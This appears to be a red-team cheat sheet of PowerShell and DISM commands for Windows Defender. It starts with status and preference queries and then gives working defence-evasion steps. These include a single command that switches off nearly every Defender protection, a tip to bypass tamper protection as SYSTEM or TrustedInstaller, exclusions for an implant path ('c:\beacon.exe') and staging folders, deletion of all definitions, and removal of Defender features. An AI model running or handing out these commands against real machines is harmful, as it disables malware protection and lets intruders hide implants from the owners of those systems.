>[!about] Certain syntax may vary depending on the version of Windows.

https://learn.microsoft.com/en-us/powershell/module/defender/?view=windowsserver2022-ps

### Check Status

```
Get-MpComputerStatus | Select-Object AMServiceEnabled,AntispywareEnabled,AntispywareSignatureLastUpdated,AntivirusEnabled,AntivirusSignatureLastUpdated,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,IsTamperProtected,DefenderSignaturesOutOfDate

Get-MpThreatDetection
Get-MpThreat
```

### Check Preference

```
Get-MpPreference | Select-Object PSComputerName,ExclusionExtension,ExclusionPath,ExclusionProcess,DisableRealtimeMonitoring,PUAProtection,RealTimeScanDirection,DisableScanningNetworkFiles,DisableScriptScanning,ExclusionIpAddress,AttackSurfaceReductionOnlyExclusions,AttackSurfaceReductionRules_Actions,AttackSurfaceReductionRules_Ids,CloudBlockLevel,DisableArchiveScanning,DisableAutoExclusions,DisableBehaviorMonitoring,DisableBlockAtFirstSeen,DisableInboundConnectionFiltering,DisableIOAVProtection,DisableRdpParsing,EnableNetworkProtection,UnknownThreatDefaultAction,SevereThreatDefaultAction,HighThreatDefaultAction,ModerateThreatDefaultAction,LowThreatDefaultAction,MAPSReporting
```
### Disable everything, minus tamper protection
	
	If tamper protection is enabled, real-time monitoring will not turn off. 
	Tamper protection can be bypassed by running as trustedinstaller or system. See DefenderControl.
	In most cases it may be easier to just whitelist your implant.
	
```
Set-MpPreference -PUAProtection disabled -DisableBlockAtFirstSeen:$true -DisableCpuThrottleOnIdleScans:$true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -DisableAutoExclusions:$true -DisablePrivacyMode:$true -RandomizeScheduleTaskTimes:$true -DisableBehaviorMonitoring:$true -DisableRealtimeMonitoring:$true -DisableScriptScanning:$true -DisableArchiveScanning:$true -DisableCatchupFullScan:$true -DisableCatchupQuickScan:$true -DisableEmailScanning:$true -DisableRemovableDriveScanning:$true -DisableScanningMappedNetworkDrivesForFullScan:$true -DisableScanningNetworkFiles:$true -DisableIOAVProtection:$true -DisableDatagramProcessing:$true -DisableIntrusionPreventionSystem:$true -DisableNetworkProtection:$true -EnableControlledFolderAccess Disabled -HighThreatDefaultAction 6 -Force -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ScanScheduleDay 8


powershell.exe -Command "Set-MpPreference -PUAProtection disabled -DisableBlockAtFirstSeen:$true -DisableCpuThrottleOnIdleScans:$true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -DisableAutoExclusions:$true -DisablePrivacyMode:$true -RandomizeScheduleTaskTimes:$true -DisableBehaviorMonitoring:$true -DisableRealtimeMonitoring:$true -DisableScriptScanning:$true -DisableArchiveScanning:$true -DisableCatchupFullScan:$true -DisableCatchupQuickScan:$true -DisableEmailScanning:$true -DisableRemovableDriveScanning:$true -DisableScanningMappedNetworkDrivesForFullScan:$true -DisableScanningNetworkFiles:$true -DisableIOAVProtection:$true -DisableDatagramProcessing:$true -DisableIntrusionPreventionSystem:$true -DisableNetworkProtection:$true -EnableControlledFolderAccess Disabled -HighThreatDefaultAction 6 -Force -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ScanScheduleDay 8"
```
### Disable Realtime Monitoring
```
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring:$true

### Enable Realtime Monitoring
Set-MpPreference -DisableRealtimeMonitoring 0
Set-MpPreference -DisableRealtimeMonitoring $false
```

### Add Exclusion
```
Add-MpPreference -ExclusionPath c:\beacon.exe
Add-MpPreference -ExclusionPath c:\windows\tasks
Add-MpPreference -ExclusionPath c:\windows\temp

### Remove
Remove-MpPreference -ExclusionPath
```

### Dump Definitions
```
"c:\Program Files\Windows Defender\mpcmdrun.exe" -RemoveDefinitions -All Set-MpPreference -DisableOAVProtection 1
```

### Remove Features
```
Dism /online /Disable-Feature /FeatureName:Windows-Defender-Default-Definitions /Remove
Dism /online /Disable-Feature /FeatureName:Windows-Defender-ApplicationGuard /Remove
```

